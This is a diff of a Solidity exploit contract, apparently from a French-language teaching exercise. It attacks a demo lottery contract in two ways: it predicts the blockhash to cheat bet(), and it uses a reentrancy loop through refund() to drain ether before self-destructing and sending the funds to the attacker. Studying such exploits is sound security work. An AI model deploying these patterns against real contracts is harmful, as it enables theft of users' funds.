@@ -46,35 +46,32 @@ contract GDGLottery {
 
 
 
-    //Inspired by Trailofbits : (Not So) Smart Contracts
-    //https://github.com/trailofbits/not-so-smart-contracts/blob/master/reentrancy/ReentrancyExploit.sol
-
-
 contract ExploitContract {
-    bool public attackModeIsOn=false;
+    bool public attackModeIsOn=false; 
     address public vulnerable_contract;
     address public owner;
 
-    function ExploitContract() public{
-        owner = msg.sender;
-    }
-
+    //Déposer des ethers sur le contrat cible
     function deposit(address _vulnerable_contract) public payable{
         vulnerable_contract = _vulnerable_contract ;
+        // call addToBalance with msg.value ethers
         require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("deposit()"))));
     }
 
-    function launch_attack() public{
-        attackModeIsOn = true;
-        require(vulnerable_contract.call(bytes4(sha3("refund()"))));
-    }
-
+    //Attaque #1: tricher avec bet()
     function win() public{
         byte toGuess = byte(blockhash(block.number-1));
         GDGLottery instance = GDGLottery(vulnerable_contract);
         instance.bet(toGuess);
     }
 
+    //Attaque #2: étape 1
+    function launch_attack() public{
+        attackModeIsOn = true;
+        require(vulnerable_contract.call(bytes4(sha3("refund()"))));
+    }  
+
+    //Attaque #2: étape 2
     function () public payable{
         if (attackModeIsOn){
             attackModeIsOn = false;
@@ -82,6 +79,11 @@ contract ExploitContract {
         }
     }
 
+    //Constructeur qui définit le owner du contract (l'attaquant)
+    function ExploitContract() public{
+        owner = msg.sender;
+    }
+    //Détruire le contrat (et envoyer les ethers restants à l'attaquant)
     function get_money(){
         suicide(owner);
     }
